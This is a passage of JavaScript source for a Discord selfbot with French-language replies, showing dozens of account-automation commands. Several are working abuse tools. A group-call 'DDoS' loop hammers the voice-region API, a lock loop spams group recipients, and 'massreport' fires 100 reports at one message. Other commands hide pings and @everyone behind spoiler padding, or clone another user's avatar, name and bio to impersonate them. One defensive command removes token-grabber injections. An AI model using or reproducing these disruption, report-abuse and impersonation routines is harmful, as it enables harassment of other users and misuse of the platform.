            if (!args[1] || !user) return message.edit(`ガ __**${name} - Groupe Owner**__ ガ\n> *Veuillez mentionner un utilisateir*`)

            message.channel.setOwner(user)
            .then( () => message.edit(`ガ __**${name} - Groupe Owner**__ ガ\n> *${user.username} est maintenant le propriétaire du groupe*`))
            .catch(() => message.edit(`ガ __**${name} - Groupe Owner**__ ガ\n> *Je n'ai pas pu transmettre la propriété du groupe*`))
        }

        else if (message.content === prefix + "sologrp"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const c = await client.channels.createGroupDM([client.user])
                .then( () => message.edit(`ガ __**${name} - Solo Groupe**__ ガ\n> *Le groupe a été crée avec succès*`))
                .catch(() => message.edit(`ガ __**${name} - Solo Groupe**__ ガ\n> *Je ne peux pas crée de groupe pour le moment*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ddosgrp")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (args[0] === "stop"){
                if (client.interval["ddos-grp"]) clearInterval(client.interval["ddos"])
                return message.edit(`ガ __**${name} - DDoS Groupe**__ ガ\n> *Le vocale du groupe ne se fait plus DDOS*`)
            }
            else {
                const channel = message.mentions.channels.first() || client.channels.cache.get(args[0]) || message.channel
                if (!channel) return message.edit(`ガ __**${name} - DDoS Groupe**__ ガ\n> *Veuillez utiliser cette commande dans un groupe*`)
                if (channel.type !== "GROUP_DM") return message.edit(`ガ __**${name} - DDoS Groupe**__ ガ\n> *Le salon indiqué doit être un groupe*`)
        
                var regions = ["brazil", "rotterdam", "hongkong", "india", "japan", "russia", "singapore", "southafrica", "sydney", "us-central", "us-east", "us-south", "us-west"];
        
                message.edit(`ガ __**${name} - DDoS Groupe**__ ガ\n> *Le vocale groupe ${channel} va se faire DDoS... \`${prefix}ddosgrp stop\` pour l'arrêter*`)
        
                var regions = ["brazil", "rotterdam", "hongkong", "india", "japan", "russia", "singapore", "southafrica", "sydney", "us-central", "us-east", "us-south", "us-west"];
                
                if (client.interval["ddos-grp"]) clearInterval(client.interval["ddos-grp"])
                client.interval["ddos-grp"] = setInterval(() => fetch(`https://discord.com/api/v9/channels/${channel?.id}/call`, {method: "PATCH", headers: {"Authorization": `${client.token}`, "Content-Type": "application/json"}, body: JSON.stringify({"region": `${regions[Math.floor(Math.random() * regions.length)]}`})}), 900);
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "lockgrp")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (args[0] === "stop"){
                if (client.interval["lock-grp"]) clearInterval(client.interval["lock-grp"])
                return message.edit(`ガ __**${name} - Lock Groupe**__ ガ\n> *Le groupe sera dévérouillé dans environ 3m*`)
            }
            else {
                const channel = message.mentions.channels.first() || client.channels.cache.get(args[0]) || message.channel
                if (!channel) return message.edit(`ガ __**${name} - Lock Groupe**__ ガ\n> *Veuillez utiliser cette commande dans un groupe*`)
                if (channel.type !== "GROUP_DM") return message.edit(`ガ __**${name} - Lock Groupe**__ ガ\n> *Le salon indiqué doit être un groupe*`)
                
                if (client.interval["lock-grp"]) clearInterval(client.interval["lock-grp"])

                client.interval["lock-grp"] = setInterval(async () => await fetch(`https://discord.com/api/v9/channels/${channel?.id}/recipients/1337`, { method: 'PUT', headers: { 'Authorization': client.token }}).catch(() => false), 250);
                message.edit(`ガ __**${name} - Lock Groupe**__ ガ\n> *Le groupe ${channel} est maintenant vérouillé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ')=== (prefix + "hiddenping")){
            message.delete()
            message.channel.send(`${args.slice(1).join(' ') || ""} ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| ${args[0] || ""}`)
        }

        else if (cmd.slice(0, 1).join(' ')=== (prefix + "hiddeneveryone")){
            message.delete()
            message.channel.send(`${args.join(' ') || ""} ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| @everyone`)
        }

        else if (cmd.slice(0, 1).join(' ')=== (prefix + "hiddenurl")){
            message.delete()
            message.channel.send(`${args.slice(1).join(' ') || ""} ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| ${args[0] || ""}`)
        }

        else if (cmd.slice(0, 1).join(' ')=== (prefix + "hiddeninvite")){
            message.delete()
            message.channel.send(`${args.slice(1).join(' ') || ""} ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| ${args[0] || ""}`)
        }

        else if (cmd.slice(0, 1).join(' ')=== (prefix + "massreport")){
            if (!args[0]) return message.edit(`ガ __**${name} - Mass Report**__ ガ\n> *Veuillez entrer l'ID d'un message*`)
            
            const m = await message.channel.messages.fetch(args[0])
            if (!m) return message.edit(`ガ __**${name} - Mass Report**__ ガ\n> *Veuillez entrer l'ID d'un message valide*`)
            message.edit(`ガ __**${name} - Mass Report**__ ガ\n> *Je vais envoyé 100 reports*`)
            
            for (let i = 0; i < 100; i++){
                if (m) m.report([72]).catch(() => false)
            }
        }

        else if (cmd.slice(0, 2).join(' ')=== (prefix + "injector check")){
            if (os.platform() !== 'win32') return message.edit(`ガ __**${name} - Injector Checker**__ ガ\n> *Cette commande est exclusive pour les windows*`)
            let appdata = process.env.LOCALAPPDATA == null ? `${(__dirname.split(":")[0])}:/Users/${(__dirname.split("\\")[2])}/AppData/Local` : process.env.LOCALAPPDATA;
            let _ = fs.readdirSync(appdata, { withFileTypes: true }).filter(r => r.isDirectory() && /(?:is)?cord/.test(r.name)).map(directory => directory.name);
            let text = "";

            _.forEach(a => {
                glob.sync(`${appdata}\\${a}\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core`).map(async a => {
            
                    if (!fs.readdirSync(a).includes('index.js')) return;
            
                    let filename = path.join(a, "index.js");
                    exec('tasklist', (_, t) => {
            
                        if (t.includes(a.split('/')[5] + '.exe')) {
                            exec(`taskkill /IM ${a.split('/')[5]}.exe /F`)
                            setTimeout(() => {
                                if (fs.existsSync(appdata + `\\${a.split('/')[5]}\\Update.exe`)) exec(`${appdata + `\\${a.split('/')[5]}\\Update.exe`} --processStart ${a.split('/')[5]}.exe`)
                            }, 2000)
                        }
                    })
            
                    if (fs.readFileSync(filename, 'utf-8').toString() !== "module.exports = require('./core.asar');") {
                        text += `> Grabber trouvé dans ${a.split('/')[5]} !\n` 
                        fs.writeFile(filename, "module.exports = require('./core.asar');", e => {            
                            fs.readFile(filename, "utf8", (e, r) => {
                                if (r.toString() !== "module.exports = require('./core.asar');") text += "> Je ne peux pas retirer le grabber, réinstaller votre discord\n\n"
                                else text += "> Grabber supprimé, veuillez modifier votre mot de passe\n\n"
                            })
                        })
                    } else if (fs.existsSync(path.join(a, "package.json"))) {
            
                        const file = require(path.join(a, "package.json"));
            
                        if (file.main && file.main !== "index.js") {
                            text += `> Grabber trouvé dans ${file["main"]} !\n\n`
                            
                            try {
                                fs.unlinkSync(path.join(a, "package.json"))
                            } catch {}
            
                            file.main = "index.js";
                            fs.writeFile(path.join(a, "package.json"), JSON.stringify(file, null, 4), () => false)
            
                        } else {
                            text += `> Votre application ${a.split("/")[5]} est vérifiée\n\n`
                            console.log(`\x1b[32mThe ${a.split('/')[5]} application is safe!\x1b[0m`)
                        }
                    } else {
                        text += `> Impossible de vérifiée l'application ${a.split('/')[5]} (pas de package.json)\n\n`
                    }
                })
            
            })

            message.edit(`ガ __**${name} - Injector Checker**__ ガ\n${text === "" ? "Aucune application discord" : text}`)
        }



        else if (cmd.slice(0, 2).join(' ')=== (prefix + "anti groupe")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (args[1] === "on"){
                antigroupe.activate = true
                fs.writeFileSync(`${__dirname}/Data/Groupes/antigroupes.json`, JSON.stringify(antigroupe, null, 4))
                message.edit(`ガ __**${name} - Anti Groupe**__ ガ\n> *L'anti groupe a été activé*`)
            }
            else if (args[1] === "off"){
                antigroupe.activate = false
                fs.writeFileSync(`${__dirname}/Data/Groupes/antigroupes.json`, JSON.stringify(antigroupe, null, 4))
                message.edit(`ガ __**${name} - Anti Groupe**__ ガ\n> *L'anti groupe a été désactivé*`)
            }
            else if (args[1] === "discret"){
                if (args[2] === "on"){
                    antigroupe.discret = true
                    fs.writeFileSync(`${__dirname}/Data/Groupes/antigroupes.json`, JSON.stringify(antigroupe, null, 4))
                    message.edit(`ガ __**${name} - Anti Groupe**__ ガ\n> *Vous allez quitter discrètement les groupes*`)
                }
                else if (args[2] === "off"){
                    antigroupe.discret = false
                    fs.writeFileSync(`${__dirname}/Data/Groupes/antigroupes.json`, JSON.stringify(antigroupe, null, 4))
                    message.edit(`ガ __**${name} - Anti Groupe**__ ガ\n> *Vous allez afficher le message pour quitter les groupes*`)
                }
            }
            else if (args[1] === "message") {
                if (args[2] === "off"){
                    antigroupe.sendmessage = false
                    fs.writeFileSync(`${__dirname}/Data/Groupes/antigroupes.json`, JSON.stringify(antigroupe, null, 4))
                    message.edit(`ガ __**${name} - Anti Groupe**__ ガ\n> *Vous n'allez pas envoyer de messages avant de quitter un groupe*`)
                }
                else {
                    antigroupe.sendmessage = true
                    antigroupe.message = args.slice(2).join(' ')
                    fs.writeFileSync(`${__dirname}/Data/Groupes/antigroupes.json`, JSON.stringify(antigroupe, null, 4))
                    message.edit(`ガ __**${name} - Anti Groupe**__ ガ\n> *Vous allez envoyer un message avant de quitter un groupe*`)
                }
            }
        }











































        // Profile

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setavatar")){
            if (message.attachments.size > 0){
                client.user.setAvatar(message.attachments.first().url)
                    .then( () => message.edit({content: `ガ __**${name} - Set Avatar**__ ガ\n> *Votre avatar a été modifié*`, files: []}))
                    .catch(() => message.edit({content: `ガ __**${name} - Set Avatar**__ ガ\n> *Votre avatar n'a pas pu être modifié*`, files: []}))
            }
            else if (args[0]?.startsWith("http")){
                client.user.setAvatar(args[0])
                    .then( () => message.edit(`ガ __**${name} - Set Avatar**__ ガ\n> *Votre avatar a été modifié*`))
                    .catch(() => message.edit(`ガ __**${name} - Set Avatar**__ ガ\n> *Votre avatar n'a pas pu être modifié*`))
            }
            else return message.edit(`ガ __**${name} - Set Avatar**__ ガ\n> *Veuillez entrer une image valide*`)
        }


        else if (cmd.slice(0, 1).join(' ') === (prefix + "setbanner")){
            if (message.attachments.size > 0){
                client.user.setBanner(message.attachments.first().url)
                    .then( () => message.edit({content: `ガ __**${name} - Set Banner**__ ガ\n> *Votre bannière a été modifié*`, files: []}))
                    .catch(() => message.edit({content: `ガ __**${name} - Set Banner**__ ガ\n> *Votre bannière n'a pas pu être modifié*`, files: []}))
            }
            else if (args[0].setBanner("http")){
                client.user.setAvatar(args[0])
                    .then( () => message.edit(`ガ __**${name} - Set Banner**__ ガ\n> *Votre bannière a été modifié*`))
                    .catch(() => message.edit(`ガ __**${name} - Set Banner**__ ガ\n> *Votre bannière n'a pas pu être modifié*`))
            }
            else return message.edit(`ガ __**${name} - Set Banner**__ ガ\n> *Veuillez entrer une image valide*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setname")){
            if (!args[0]) message.edit(`ガ __**${name} - Set Name**__ ガ\n> *Veuillez entrer un pseudo valide*`)
            client.user.setUsername(args.join(' '))
                .then( () => message.edit(`ガ __**${name} - Set Name**__ ガ\n> *Votre pseudo a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Set Name**__ ガ\n> *Votre pseudo n'a pas pu être modifié*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setglobal")){
            client.user.setGlobalName(args.join(' ') || null)
                .then( () => message.edit(`ガ __**${name} - Set Name**__ ガ\n> *Votre pseudo a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Set Name**__ ガ\n> *Votre pseudo n'a pas pu être modifié*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sethypesquad")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const hypesquadlist = ["bravery", "brilliance", "ballance", "clear"]
            const hypesquad = (house) => {
                switch (house) {
                    case "clear":
                    return 0
                    case "bravery":
                    return 1
                    case "brilliance":
                    return 2
                    case "ballance":
                    return 3
                }
            }
            
            if (!args[0] || !hypesquadlist.includes(args[0])) return message.edit(`ガ __**${name} - Set Hypesquad**__ ガ\n> *Veuillez entrer un nom de maison valide: \`${hypesquadlist.map(r => r).join(', ')}\`*`)
    
            client.user.setHypeSquad(hypesquad(args[0]))
                .then( () => message.edit(`ガ __**${name} - Set Hypesquad**__ ガ\n> *Vous avez changé de hypesquad*`))
                .catch(() => message.edit(`ガ __**${name} - Set Hypesquad**__ ガ\n> *Je n'ai pas pu modifier votre hypesquad*`))
        }

        else if (message.content === prefix + "setdark"){
            client.settings.setTheme("dark")
                .then( () => message.edit(`ガ __**${name} - Set Dark**__ ガ\n> *Votre thème a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Set Dark**__ ガ\n> *Je n'ai pas pu modifié votre thème*`))
        }

        else if (message.content === prefix + "setlight"){
            client.settings.setTheme("light")
                .then( () => message.edit(`ガ __**${name} - Set Light**__ ガ\n> *Votre thème a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Set Light**__ ガ\n> *Je n'ai pas pu modifié votre thème*`))
        }

        else if (message.content === prefix + "setbio"){
            client.user.setAboutMe(args.join(' ') || null)
                .then( () => message.edit(`ガ __**${name} - Set Bio**__ ガ\n> *Votre bio a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Set Bio**__ ガ\n> *Je n'ai pas pu modifié votre bio*`))
        }

        else if (message.content === prefix + "setcompact"){
            if (args[0] === "on"){
                client.settings.setDisplayCompactMode(true)
                .then( () => message.edit(`ガ __**${name} - Set Compact**__ ガ\n> *Le mode compacte a été activé*`))
                .catch(() => message.edit(`ガ __**${name} - Set Compact**__ ガ\n> *Je n'ai pas pu activé le mode compacte*`))

            }
            else if (args[0] === "off"){
                client.settings.setDisplayCompactMode(false)
                .then( () => message.edit(`ガ __**${name} - Set Compact**__ ガ\n> *Le mode compacte a été désactivé*`))
                .catch(() => message.edit(`ガ __**${name} - Set Compact**__ ガ\n> *Je n'ai pas pu désactivé le mode compacte*`))
            }
        }

        else if (message.content === prefix + "setpronom"){
            client.user.setPronouns(args.join(' ') || null)
                .then( () => message.edit(`ガ __**${name} - Set Pronom**__ ガ\n> *Votre pronom a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Set Pronom**__ ガ\n> *Je n'ai pas pu modifié votre pronom*`))
        }

        else if (message.content === prefix + "junkname"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            client.user.setGlobalName("𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫")
                .then( () => message.edit(`ガ __**${name} - Junk Name**__ ガ\n> *Votre pseudo a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Junk Name**__ ガ\n> *Je n'ai pas pu modifié votre pseudo*`))
        }

        else if (message.content === prefix + "invisiblename"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            client.user.setGlobalName(" ​")
                .then( () => message.edit(`ガ __**${name} - Invisible Name**__ ガ\n> *Votre pseudo a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Invisible Name**__ ガ\n> *Je n'ai pas pu modifié votre pseudo*`))
        }

        else if (message.content === prefix + "invisiblepp"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            client.user.setAvatar("https://i.imgur.com/Hw9MBjX.png")
                .then( () => message.edit(`ガ __**${name} - Invisible Avatar**__ ガ\n> *Votre avatar a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Invisible Avatar**__ ガ\n> *Je n'ai pas pu modifié votre avatar*`))
        }













































        // Commandes robber

        else if (cmd.slice(0, 1).join(' ') === (prefix + "robname")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Rob Name**__ ガ\n> *Veuillez mentionner un utilisateur*`)
            if (!user.globalName) return message.edit(`ガ __**${name} - Rob Name**__ ガ\n> *${user.username} n'a pas de pseudo globale*`)

            client.user.setGlobalName(user.globalName)
                .then( () => message.edit(`ガ __**${name} - Rob Name**__ ガ\n> *Votre pseudo a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Rob Name**__ ガ\n> *Je n'ai pas pu modifié votre pseudo*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "robpronom")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Rob Pronom**__ ガ\n> *Veuillez mentionner un utilisateur*`)
            if (!user.pronouns) return message.edit(`ガ __**${name} - Rob Pronom**__ ガ\n> *${user.username} n'a pas de pronom*`)

            client.user.setPresence(user.pronouns)
                .then( () => message.edit(`ガ __**${name} - Rob Pronom**__ ガ\n> *Votre pronom a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Rob Pronom**__ ガ\n> *Je n'ai pas pu modifié votre pronom*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "robavatar")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Rob Avatar**__ ガ\n> *Veuillez mentionner un utilisateur*`)
            if (!user.avatar) return message.edit(`ガ __**${name} - Rob Avatar**__ ガ\n> *${user.username} n'a pas d'avatar*`)

            client.user.setAvatar(user.displayAvatarURL({dynamic: true, format: "webp"}))
                .then( () => message.edit(`ガ __**${name} - Rob Avatar**__ ガ\n> *Votre avatar a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Rob Avatar**__ ガ\n> *Je n'ai pas pu modifié votre avatar*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "robbanner")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Rob Banner**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            await user.fetch()
            if (!user.banner) return message.edit(`ガ __**${name} - Rob Banner**__ ガ\n> *${user.username} n'a pas de bannière*`)

            client.user.setBanner(user.bannerURL({dynamic: true, format: "webp"}))
                .then( () => message.edit(`ガ __**${name} - Rob Banner**__ ガ\n> *Votre bannière a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Rob Banner**__ ガ\n> *Je n'ai pas pu modifié votre bannière*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "robbio")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Rob Bio**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            await user.fetch()
            if (!user.banner) return message.edit(`ガ __**${name} - Rob Bio**__ ガ\n> *${user.username} n'a pas de bio*`)

            client.user.setAboutMe(user.bio)
                .then( () => message.edit(`ガ __**${name} - Rob Bio**__ ガ\n> *Votre "A propos de moi" a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Rob Bio**__ ガ\n> *Je n'ai pas pu modifié votre "A propos de moi"*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "robhypesquad")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Rob Hypesquad**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            if (user.flags.toArray().includes("HOUSE_BRILLIANCE")) client.user.setHypeSquad("HOUSE_BRILLIANCE")
            else if (user.flags.toArray().includes("HOUSE_BRAVERY")) client.user.setHypeSquad("HOUSE_BRAVERY")
            else if (user.flags.toArray().includes("HOUSE_BALANCE")) client.user.setHypeSquad("HOUSE_BALANCE")
            else client.user.setHypeSquad(0)
            message.edit(`ガ __**${name} - Rob Hypesquad**__ ガ\n> *Votre hypesquad a été modifié*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rob")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!args[0] || !user) return message.edit(`ガ __**${name} - Rob**__ ガ\n> *Veuillez mentionner un utilisateur*`)

            let status = false
            let presence = false
            let flags = await user.fetchFlags()
            await user.fetch()

            if (flags.toArray().includes("HOUSE_BRILLIANCE")) client.user.setHypeSquad("HOUSE_BRILLIANCE").catch(() => false)
            if (flags.toArray().includes("HOUSE_BRAVERY")) client.user.setHypeSquad("HOUSE_BRAVERY").catch(() => false)
            if (flags.toArray().includes("HOUSE_BALANCE")) client.user.setHypeSquad("HOUSE_BALANCE").catch(() => false)      
            client.user.setAvatar(user.displayAvatarURL({dynamic: true, format: "webp"}) || null).catch(() => false)
            client.user.setBanner(user.bannerURL({dynamic: true, format: "webp"}) || null).catch(() => false)
            client.user.setGlobalName(user.globalName || null).catch(() => false)
            client.user.setPronouns(user.pronouns || null).catch(() => false)
            client.user.setAboutMe(user.bio || null).catch(() => false)

            client.guilds.cache.filter(guild => guild.members.cache.has(user?.id)).forEach(guild => {
                if (status) return;
                const member = guild.members.cache.get(user?.id)
                if (member && !presence && member.presence.status){
                    client.user.setPresence({status: member.presence.status})
                    presence = true
                }
                if (member && member.presence && member.presence.activities.filter(a => a.type === "CUSTOM").length > 0) status = true

                const activity = member.presence.activities.filter(a => a.type === "CUSTOM")[0]
                if (activity.emoji || activity.state){
                    if (activity.emoji && estEmojiDiscord(activity.emoji.name)){
    
                        const r = new discord.CustomStatus(client)
                            .setEmoji(client.user.nitroType !== "NONE" ? activity.emoji.name : undefined).setState(activity.state)
                        client.user.setPresence({activities: [r]})
                    }
                    else {
                        const r = new discord.CustomStatus(client).setEmoji(activity.emoji?.name || undefined).setState(activity.state)
                        client.user.setPresence({activities: [r]})
                    }        
                }
            })

            message.edit(`ガ __**${name} - Rob**__ ガ\n> *Vous avez copié ${user.username}*`)
        }
































































        // Commandes guilds

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gname")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Name**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Name**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Guild Name**__ ガ\n> *Veuillez entrer un nouveau nom de serveur*`)

            message.guild.setName(args.join(' '))
                .then( () => message.edit(`ガ __**${name} - Guild Name**__ ガ\n> *Le nom du serveur a été modifié*`))
                .catch(() => message.edit(`ガ __**${name} - Guild Name**__ ガ\n> *Je n'ai pas pu modifier le nom du serveur*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "gavatar")){
            if (!message.guild) return message.edit(`ガ __**${name} - Guild Avatar**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Guild Avatar**__ ガ\n> *Vous n'avez pas les permissions pour utiliser cette commande*`)
        
            if (message.attachments.size > 0){
                message.guild.setIcon(message.attachments.first().url)
                .then( () => message.edit({content: `ガ __**${name} - Guild Avatar**__ ガ\n> *L'icone du serveur a été modifiée*`, files: []}))
                .catch(() => message.edit({content: `ガ __**${name} - Guild Avatar**__ ガ\n> *Je n'ai pas pu modifié l'icone du serveur*`, files: []}))
            }
            else if (args[0]?.startsWith("http")){
                message.guild.setIcon(args[0])
                .then( () => message.edit(`ガ __**${name} - Guild Avatar**__ ガ\n> *L'icone du serveur a été modifiée*`))
